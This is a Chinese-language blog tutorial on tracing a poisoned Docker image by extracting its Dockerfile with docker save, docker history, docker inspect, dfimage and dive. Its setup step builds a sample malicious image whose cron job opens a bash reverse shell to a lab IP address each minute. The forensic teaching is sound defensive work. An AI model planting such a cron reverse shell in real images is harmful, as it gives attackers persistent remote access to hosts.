---
title: 分步指南：Docker镜像解析获取Dockerfile文件
date: 2023-09-20 21:57:24
categories:
  - Docker
tags:
  - 分步指南
description: 在这篇博文中，我们将探讨如何使用Docker镜像解析获取Dockerfile文件。
cover: https://s2.loli.net/2023/09/20/sUFS6zowCbmVJdf.webp
---

## 一、概述
当涉及到容器镜像的安全时，特别是在出现镜像投毒引发的安全事件时，追溯镜像的来源和解析Dockerfile文件是应急事件处理的关键步骤。

## 二、环境准备
利用Dockfile构建一个反弹shell的恶意镜像：

```
FROM ubuntu:20.04
RUN  apt-get update &&\
     apt-get install -y cron &&\
     (echo '* * * * * bash -c "bash -i >& /dev/tcp/192.168.99.242/12345 0>&1"'; crontab -l )| crontab
ENTRYPOINT ["cron","-f","&&"]
CMD ["/bin/bash"]

```
## 三、镜像解析Dockerfile
### （1） 镜像文件解析

在镜像的元数据信息中，到镜像构建所使用的 Dockerfile，可以成功解析 Docker 镜像并获取其 Dockerfile 内容，以了解镜像的构建过程和引入的软件包及配置。
```
docker save -o test.tar test:v1.0
 tar -xvf test.tar 
 ```
 ![](https://s2.loli.net/2023/09/20/WfGcAEDaw5sRdFY.png)
 
### （2） docker命令参数

使用docker history 命令查看指定镜像的创建历史，展示只能看到一部分，可以加上 --no-trunc，就可以看到全部信息。
```
docker history test:v1.0 
docker history test:v1.0  --no-trunc
```
![](https://s2.loli.net/2023/09/20/svuPy6DYhi1EoOB.png)

使用docker inspect命令来查看Docker镜像的详细信息，通过–format参数可自行定义输出信息，获取镜像的配置信息。
```
docker inspect --format='{{json .Config}}' test:v1.0
```
![](https://s2.loli.net/2023/09/20/dcrOSksfU196uET.png)
### （3）dfimage

dfimage是一款第三方工具，可用来从镜像中提取 Dockerfile

1. 生成快捷方式，使用dfimage可以输出很详细的 Dockerfile。
```
alias dfimage="docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"
dfimage -sV=1.36  test:v1.0
```
![](https://s2.loli.net/2023/09/20/Nuc5ZrzOXFj8tDy.png)

### （4）Docker镜像分析神器 Dive

Dive是一款Docker镜像分析神器，分析和浏览 Docker 容器镜像内部，可以很详细的看到每一层文件的变化。
```
alias dive="docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive"
dive test:v1.0
```


